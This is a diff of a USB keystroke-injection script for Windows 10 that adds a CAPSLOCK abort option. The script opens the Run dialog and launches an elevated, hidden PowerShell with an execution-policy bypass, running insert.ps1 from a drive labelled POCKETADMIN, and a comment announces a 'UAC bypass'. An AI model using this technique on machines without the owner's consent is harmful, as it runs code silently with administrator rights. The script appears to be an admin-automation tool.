@@ -1,12 +1,14 @@
 REM --- target: windows 10 ---
 REM --- wait unitl host has done all its initializations ---
 WAITFOR_INIT
-DELAY 500
+
+REM --- allow user to prevent payload execution by tapping CAPSLOCK during insertion ---
+ALLOW_EXIT
 
 REM --- close file manager popup window (opens automatically as device is plugged in) ---
 ALT F4
 
-REM --- make sure input language is set to English ---
+REM --- make sure input language is set to English (if it is not default language) ---
 DEFAULT_DELAY 300
 HOLD GUI
 SPACE
@@ -16,12 +18,11 @@ ENTER
 DEFAULT_DELAY 0
 RELEASE
 
-
 REM --- find appropriate USB drive (FAT partition label must be POCKETADMIN) ---
-REM --- then run insert.ps1 script from its root directory as administartor ---
+REM --- execute insert.ps1 script from its root directory as administartor ---
 GUI r
 DELAY 100
-STRING powershell start-process powershell -verb runAs {-NoP -W hidden -Exec bypass  .((Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter+':\insert.ps1')}
+STRING powershell start-process powershell -verb runas {-exec bypass -noP -wind hidden -nonI  .((Get-Volume -FileSystemLabel POCKETADMIN).DriveLetter+':\insert.ps1')}
 ENTER
 
 REM --- UAC bypass, repeated 5 times just in case GUI acts too slow ---
